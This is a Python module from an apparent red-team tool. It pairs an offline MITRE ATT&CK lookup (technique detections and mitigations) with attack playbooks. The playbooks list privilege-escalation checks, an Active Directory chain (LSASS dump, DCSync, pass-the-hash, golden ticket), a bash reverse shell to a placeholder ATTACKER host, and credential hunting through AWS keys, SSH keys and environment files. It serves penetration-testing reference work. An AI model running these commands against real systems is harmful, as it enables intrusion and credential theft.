#!/usr/bin/env python3
"""
NexShell — MITRE ATT&CK Knowledge Engine  (knowledge/mitre.py)
Offline MITRE ATT&CK technique database for documentation and training.
Maps sessions/commands/findings to techniques.

CLI:
    mitre show T1078
    mitre search lateral movement
    mitre tag T1078
"""

from typing import Dict, List, Optional

# ── Compact MITRE ATT&CK subset (key Red Team techniques) ─────────────────────
# Full database can be loaded from enterprise-attack.json (MITRE STIX)

MITRE_DB: Dict[str, dict] = {
    # Initial Access
    "T1190": {
        "name": "Exploit Public-Facing Application",
        "tactic": "Initial Access",
        "description": "Exploit a weakness in an internet-facing application to gain access.",
        "detection": "Monitor web server logs for unusual requests. WAF alerting.",
        "mitigation": "Patch management, WAF, network segmentation.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    "T1133": {
        "name": "External Remote Services",
        "tactic": "Initial Access",
        "description": "Leverage external remote services (VPN, RDP, SSH) for initial access.",
        "detection": "Monitor for unusual auth attempts on remote services.",
        "mitigation": "MFA, VPN with certificate auth, IP allowlisting.",
        "platforms": ["Linux", "Windows"],
    },
    "T1078": {
        "name": "Valid Accounts",
        "tactic": "Initial Access / Persistence / Privilege Escalation",
        "description": "Use credentials of existing valid accounts to bypass access controls.",
        "detection": "Monitor for anomalous account activity, unusual login times/locations.",
        "mitigation": "PAM, MFA, privileged access workstations, credential rotation.",
        "platforms": ["Linux", "Windows", "macOS", "Cloud"],
    },
    # Execution
    "T1059": {
        "name": "Command and Scripting Interpreter",
        "tactic": "Execution",
        "description": "Use scripting interpreters (bash, PowerShell, Python) to execute commands.",
        "detection": "Script block logging, PowerShell transcription, audit logs.",
        "mitigation": "AppLocker, WDAC, constrained language mode.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    "T1059.001": {
        "name": "PowerShell",
        "tactic": "Execution",
        "description": "Use PowerShell to execute commands and scripts.",
        "detection": "Enable PowerShell Script Block Logging (4104), Module Logging.",
        "mitigation": "Constrained Language Mode, AMSI, AppLocker.",
        "platforms": ["Windows"],
    },
    # Persistence
    "T1053": {
        "name": "Scheduled Task/Job",
        "tactic": "Persistence / Privilege Escalation",
        "description": "Abuse task scheduling to maintain persistence or escalate privileges.",
        "detection": "Monitor for schtasks.exe, at.exe, cron job modifications.",
        "mitigation": "Restrict task scheduler permissions, audit cron jobs.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    "T1136": {
        "name": "Create Account",
        "tactic": "Persistence",
        "description": "Create a new account to maintain access.",
        "detection": "Audit account creation events (Event ID 4720).",
        "mitigation": "Monitor privileged account creation, MFA for new accounts.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    # Privilege Escalation
    "T1068": {
        "name": "Exploitation for Privilege Escalation",
        "tactic": "Privilege Escalation",
        "description": "Exploit a software vulnerability to escalate privileges.",
        "detection": "Monitor for unusual process privilege changes.",
        "mitigation": "Patch management, least privilege, exploit mitigations (ASLR/DEP).",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    "T1548": {
        "name": "Abuse Elevation Control Mechanism",
        "tactic": "Privilege Escalation",
        "description": "Bypass UAC, SUID/GUID abuse, sudo exploitation.",
        "detection": "Monitor UAC bypass attempts, unusual sudo usage.",
        "mitigation": "UAC at highest level, audit SUID/GUID binaries, sudo hardening.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    # Defense Evasion
    "T1070": {
        "name": "Indicator Removal",
        "tactic": "Defense Evasion",
        "description": "Delete or modify artifacts to remove evidence of intrusion.",
        "detection": "Monitor for log deletion events (Event ID 1102), file deletions.",
        "mitigation": "Centralized logging (SIEM), log integrity monitoring.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    "T1027": {
        "name": "Obfuscated Files or Information",
        "tactic": "Defense Evasion",
        "description": "Encode/encrypt/pack malicious payloads to evade detection.",
        "detection": "Static/behavioral analysis, entropy analysis.",
        "mitigation": "Script block logging, AMSI, EDR with behavioral detection.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    # Credential Access
    "T1552": {
        "name": "Unsecured Credentials",
        "tactic": "Credential Access",
        "description": "Find credentials in files, env vars, scripts, config files.",
        "detection": "File access auditing, DLP monitoring.",
        "mitigation": "Secrets management (Vault), env var auditing.",
        "platforms": ["Linux", "Windows", "macOS", "Cloud"],
    },
    "T1552.004": {
        "name": "Private Keys",
        "tactic": "Credential Access",
        "description": "Search for private key files (id_rsa, .pem) for lateral movement.",
        "detection": "Monitor access to .ssh directories, private key files.",
        "mitigation": "Encrypted key storage, passphrase enforcement.",
        "platforms": ["Linux", "macOS"],
    },
    "T1552.005": {
        "name": "Cloud Instance Metadata API",
        "tactic": "Credential Access",
        "description": "Access cloud metadata API to obtain credentials (AWS IMDS, GCP, Azure).",
        "detection": "Monitor metadata API calls from unusual processes.",
        "mitigation": "IMDSv2 enforcement, block metadata endpoint from containers.",
        "platforms": ["Cloud"],
    },
    "T1110": {
        "name": "Brute Force",
        "tactic": "Credential Access",
        "description": "Systematically guess credentials using wordlists or password spraying.",
        "detection": "Monitor for repeated auth failures (Event ID 4625).",
        "mitigation": "Account lockout, MFA, rate limiting.",
        "platforms": ["Linux", "Windows", "macOS", "Cloud"],
    },
    "T1110.002": {
        "name": "Password Cracking",
        "tactic": "Credential Access",
        "description": "Crack captured password hashes offline.",
        "detection": "Monitor for credential dumping activity.",
        "mitigation": "Strong password policy, modern hash algorithms (bcrypt).",
        "platforms": ["Linux", "Windows"],
    },
    # Lateral Movement
    "T1021": {
        "name": "Remote Services",
        "tactic": "Lateral Movement",
        "description": "Use remote services (SSH, RDP, SMB, WinRM) for lateral movement.",
        "detection": "Monitor unusual lateral connections, non-standard hours.",
        "mitigation": "Network segmentation, jump hosts, MFA.",
        "platforms": ["Linux", "Windows"],
    },
    "T1021.002": {
        "name": "SMB/Windows Admin Shares",
        "tactic": "Lateral Movement",
        "description": "Use SMB and admin shares (C$, ADMIN$, IPC$) for lateral movement.",
        "detection": "Monitor SMB connections to admin shares (Event ID 5140).",
        "mitigation": "Disable SMBv1, restrict admin shares, network segmentation.",
        "platforms": ["Windows"],
    },
    # Collection
    "T1560": {
        "name": "Archive Collected Data",
        "tactic": "Collection",
        "description": "Compress/encrypt collected data before exfiltration.",
        "detection": "Monitor for archiving tool usage (zip, tar, 7z).",
        "mitigation": "DLP, egress filtering.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    # Exfiltration
    "T1041": {
        "name": "Exfiltration Over C2 Channel",
        "tactic": "Exfiltration",
        "description": "Exfiltrate data over the existing C2 channel.",
        "detection": "Anomalous outbound data volumes, unusual C2 traffic.",
        "mitigation": "Egress filtering, DLP, network monitoring.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    # Command & Control
    "T1105": {
        "name": "Ingress Tool Transfer",
        "tactic": "Command and Control",
        "description": "Transfer tools/payloads to the target system.",
        "detection": "Monitor for wget/curl/certutil downloads.",
        "mitigation": "Application whitelisting, egress filtering.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    "T1572": {
        "name": "Protocol Tunneling",
        "tactic": "Command and Control",
        "description": "Tunnel C2 traffic through legitimate protocols (DNS, HTTP, ICMP).",
        "detection": "DNS query volume analysis, HTTP C2 beacon detection.",
        "mitigation": "DNS filtering, HTTPS inspection, network monitoring.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    # Impact
    "T1486": {
        "name": "Data Encrypted for Impact",
        "tactic": "Impact",
        "description": "Encrypt data to render it inaccessible (ransomware).",
        "detection": "File access patterns, entropy monitoring.",
        "mitigation": "Backups, EDR, immutable storage.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
    # Container
    "T1611": {
        "name": "Escape to Host",
        "tactic": "Privilege Escalation",
        "description": "Break out of a container to gain host-level access.",
        "detection": "Monitor for container breakout indicators, Docker socket access.",
        "mitigation": "Rootless containers, seccomp, AppArmor, no privileged containers.",
        "platforms": ["Linux", "Containers"],
    },
    # AD
    "T1003": {
        "name": "OS Credential Dumping",
        "tactic": "Credential Access",
        "description": "Dump credentials from OS (LSASS, SAM, NTDS.dit, /etc/shadow).",
        "detection": "Monitor LSASS access (Event ID 4656), mimikatz signatures.",
        "mitigation": "Credential Guard, LSA Protection, DPAPI.",
        "platforms": ["Linux", "Windows"],
    },
    "T1018": {
        "name": "Remote System Discovery",
        "tactic": "Discovery",
        "description": "Enumerate hosts on the network via ping sweep, nmap, ARP.",
        "detection": "Network scan detection, unusual ICMP/ARP traffic.",
        "mitigation": "Network monitoring, IDS/IPS.",
        "platforms": ["Linux", "Windows", "macOS"],
    },
}


# ══════════════════════════════════════════════════════════════════════════════
#  MITRE ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class MITREEngine:
    """Offline MITRE ATT&CK lookup and mapping engine."""

    def __init__(self):
        self._db = MITRE_DB
        self._tagged: Dict[str, List[str]] = {}   # session_id → [technique_ids]

    def get(self, technique_id: str) -> Optional[dict]:
        """Look up a technique by ID (e.g. T1078)."""
        return self._db.get(technique_id.upper())

    def search(self, keyword: str) -> List[dict]:
        """Search by keyword in name, tactic, or description."""
        kw = keyword.lower()
        results = []
        for tid, t in self._db.items():
            if (kw in t['name'].lower() or
                    kw in t['tactic'].lower() or
                    kw in t['description'].lower()):
                results.append({'id': tid, **t})
        return results

    def by_tactic(self, tactic: str) -> List[dict]:
        """Filter techniques by tactic."""
        tac = tactic.lower()
        return [
            {'id': tid, **t}
            for tid, t in self._db.items()
            if tac in t['tactic'].lower()
        ]

    def tag_session(self, session_id: int, technique_id: str):
        """Associate a MITRE technique with a session."""
        sid = str(session_id)
        if technique_id not in self._db:
            return False
        self._tagged.setdefault(sid, [])
        if technique_id not in self._tagged[sid]:
            self._tagged[sid].append(technique_id)
        return True

    def session_techniques(self, session_id: int) -> List[dict]:
        """Get all techniques tagged to a session."""
        tids = self._tagged.get(str(session_id), [])
        return [{'id': t, **self._db[t]} for t in tids if t in self._db]

    def format_technique(self, technique_id: str) -> str:
        """Pretty-print a technique for CLI display."""
        t = self.get(technique_id)
        if not t:
            return f"  Unknown technique: {technique_id}"
        return '\n'.join([
            f"\n  ┌─── MITRE ATT&CK: {technique_id} ─────────────────────────",
            f"  │  Name       : {t['name']}",
            f"  │  Tactic     : {t['tactic']}",
            f"  │  Platforms  : {', '.join(t['platforms'])}",
            f"  │",
            f"  │  Description: {t['description']}",
            f"  │",
            f"  │  Detection  : {t['detection']}",
            f"  │  Mitigation : {t['mitigation']}",
            f"  └──────────────────────────────────────────────────────────\n",
        ])

    def list_all(self) -> str:
        """List all techniques in compact table format."""
        lines = [
            f"\n  {'ID':<12} {'Name':<45} {'Tactic'}",
            f"  {'─'*12} {'─'*45} {'─'*25}",
        ]
        for tid, t in sorted(self._db.items()):
            lines.append(f"  {tid:<12} {t['name']:<45} {t['tactic'][:25]}")
        lines.append(f"\n  Total: {len(self._db)} techniques loaded\n")
        return '\n'.join(lines)


# ══════════════════════════════════════════════════════════════════════════════
#  PLAYBOOKS
# ══════════════════════════════════════════════════════════════════════════════

PLAYBOOKS: Dict[str, dict] = {
    "linux-privesc": {
        "name": "Linux Privilege Escalation",
        "description": "Step-by-step Linux PrivEsc methodology",
        "mitre": ["T1548", "T1068", "T1053"],
        "steps": [
            "1. Check current user: id && whoami",
            "2. Check sudo rights: sudo -l",
            "3. Find SUID/SGID binaries: find / -perm -4000 -o -perm -2000 2>/dev/null",
            "4. Check writable cron jobs: cat /etc/cron* /var/spool/cron/* 2>/dev/null",
            "5. Check PATH hijacking: echo $PATH — look for writable dirs",
            "6. Check running services: ps aux | grep root",
            "7. Check kernel version: uname -a — search for public exploits",
            "8. Check capabilities: getcap -r / 2>/dev/null",
            "9. Check NFS: cat /etc/exports — look for no_root_squash",
            "10. Check for passwords in files: grep -r 'password' /etc /home 2>/dev/null",
        ],
    },
    "windows-privesc": {
        "name": "Windows Privilege Escalation",
        "description": "Step-by-step Windows PrivEsc methodology",
        "mitre": ["T1548", "T1068", "T1053"],
        "steps": [
            "1. Check privileges: whoami /priv",
            "2. Check groups: whoami /groups",
            "3. Find unquoted service paths: wmic service get name,pathname,startmode | findstr /i /v c:\\windows\\",
            "4. Check writable service binaries: icacls <binary_path>",
            "5. Check AlwaysInstallElevated: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
            "6. Check stored credentials: cmdkey /list",
            "7. Check scheduled tasks: schtasks /query /fo LIST /v | findstr /i 'run as'",
            "8. Check SeImpersonatePrivilege → PrintSpoofer/JuicyPotato",
            "9. Check for CVE-2021-1675 (PrintNightmare) if spooler running",
            "10. Run WinPEAS for automated enumeration",
        ],
    },
    "active-directory": {
        "name": "Active Directory Attack Chain",
        "description": "AD enumeration and attack methodology",
        "mitre": ["T1018", "T1003", "T1021.002", "T1078"],
        "steps": [
            "1. Enumerate domain: net user /domain && net group /domain",
            "2. Find DC: nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
            "3. BloodHound: SharpHound collection → analyze attack paths",
            "4. Password spray: CrackMapExec smb <dc> -u users.txt -p Password123",
            "5. Check Kerberoastable accounts: GetUserSPNs.py -request",
            "6. Check AS-REP Roasting: GetNPUsers.py -usersfile users.txt",
            "7. LSASS dump (if SYSTEM): procdump -ma lsass.exe || mimikatz",
            "8. DCSync (if DA/replication rights): mimikatz lsadump::dcsync",
            "9. Pass-the-Hash: CrackMapExec smb <target> -u admin -H <NTLM>",
            "10. Golden Ticket: mimikatz kerberos::golden",
        ],
    },
    "web-to-shell": {
        "name": "Web Application to Shell",
        "description": "Web application exploitation to reverse shell",
        "mitre": ["T1190", "T1059", "T1105"],
        "steps": [
            "1. Identify tech stack: Wappalyzer, whatweb, HTTP headers",
            "2. Directory enumeration: feroxbuster/gobuster/dirsearch",
            "3. Vulnerability scan: nikto, nuclei",
            "4. Test common vulns: SQLi, LFI, RCE, SSTI, XXE",
            "5. LFI → RCE via log poisoning / PHP filter chain",
            "6. File upload bypass: change Content-Type, double extension",
            "7. Upload webshell → trigger via URL",
            "8. Upgrade to reverse shell: bash -i >& /dev/tcp/ATTACKER/PORT 0>&1",
            "9. Stabilize shell with PTY upgrade",
            "10. Begin post-exploitation enumeration",
        ],
    },
    "credential-hunting": {
        "name": "Credential Hunting",
        "description": "Find credentials on compromised systems",
        "mitre": ["T1552", "T1552.004", "T1003"],
        "steps": [
            "1. Check environment: env | grep -iE 'pass|key|secret|token'",
            "2. Search .env files: find / -name '.env' 2>/dev/null | xargs grep -l ''",
            "3. Check .bash_history: cat ~/.bash_history | grep -iE 'pass|ssh|curl'",
            "4. Find config files: grep -rn 'password' /var/www /opt /home 2>/dev/null",
            "5. Check AWS credentials: cat ~/.aws/credentials",
            "6. Check SSH keys: find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
            "7. Check browser passwords: look in profile directories",
            "8. Check database configs: wp-config.php, database.yml, settings.py",
            "9. Check running process args: ps aux | grep -i pass",
            "10. Check /proc/self/environ for leaked vars",
        ],
    },
}


class PlaybookEngine:
    """Access and display attack playbooks."""

    def get(self, name: str) -> Optional[dict]:
        return PLAYBOOKS.get(name)

    def list_all(self) -> List[dict]:
        return [{'id': k, **v} for k, v in PLAYBOOKS.items()]

    def format(self, name: str) -> str:
        pb = self.get(name)
        if not pb:
            available = ', '.join(PLAYBOOKS.keys())
            return f"  Playbook '{name}' not found. Available: {available}"
        lines = [
            f"\n  ╔══ Playbook: {pb['name']} ══",
            f"  ║  {pb['description']}",
            f"  ║  MITRE: {', '.join(pb['mitre'])}",
            f"  ╠══ Steps:",
        ]
        for step in pb['steps']:
            lines.append(f"  ║  {step}")
        lines.append("  ╚" + "═" * 50 + "\n")
        return '\n'.join(lines)


# ── Singletons ─────────────────────────────────────────────────────────────────
mitre     = MITREEngine()
playbooks = PlaybookEngine()
